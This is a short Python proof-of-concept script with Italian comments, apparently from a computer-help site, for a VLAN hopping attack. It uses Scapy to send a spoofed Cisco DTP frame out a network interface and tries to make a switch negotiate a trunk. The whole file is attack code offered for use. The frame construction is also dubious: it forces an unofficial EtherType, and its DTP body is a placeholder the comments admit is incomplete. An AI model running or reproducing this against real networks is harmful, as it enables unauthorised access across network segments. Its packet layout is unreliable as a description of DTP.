#!/usr/bin/env python3
# VLAN hopping - aiutocomputerhelp.it 2025
# This software is a proof-of-concept (PoC) of a VLAN Hopping attack based on DTP (Dynamic Trunking Protocol).
from scapy.all import *
def send_dtp_frame(iface, src_mac, dst_mac="01:00:0c:cc:cc:cc"):
    # Questo MAC di destinazione è tipico per alcuni protocolli Cisco (01:00:0c:cc:cc:cc).
    # DTP viene incapsulato in un frame Ethernet con un'intestazione LLC/SNAP
    # per protocolli proprietari Cisco (OUI=0x00000c, protocol=0x2004).
    # Creazione del frame Ethernet
    eth = Ether(src=src_mac, dst=dst_mac, type=0xaaaa)  # type 0xaaaa non ufficiale, qui forzato per passare i dati LLC
   
    # Creazione dell'header LLC e SNAP:
    # LLC: dsap=0xAA, ssap=0xAA, ctrl=0x03
    # SNAP: OUI=0x00000c (Cisco), code=0x2004 (DTP)
    llc_snap = LLC(dsap=0xAA, ssap=0xAA, ctrl=0x03) / SNAP(OUI=0x00000C, code=0x2004)
    # Corpo DTP rudimentale
    # Questa parte include campi come Version, Domain, Status, ecc.
    # Qui inseriamo solo un payload Raw a scopo dimostrativo.
    # Per un'interazione più realistica, bisognerebbe costruire esattamente
    # la struttura DTP (TLV, lunghezza, versione, ecc.)
    dtp_data = Raw(load=b"\x01\x01\x00\x0aCiscoDTP\x00\x01\x01\x00")
    # Componi il pacchetto completo
    dtp_packet = eth / llc_snap / dtp_data
    # Invio del pacchetto in loop per vedere se lo switch risponde
    # oppure una singola volta per test
    sendp(dtp_packet, iface=iface, verbose=True)
if __name__ == "__main__":
    # Interfaccia di rete da utilizzare (modificala secondo il tuo sistema)
    interface = "eth0"
    # MAC sorgente (puoi utilizzare quello della tua scheda o uno random)
    source_mac = "12:34:56:78:9a:bc"
    # Invio del frame DTP
    send_dtp_frame(interface, source_mac)
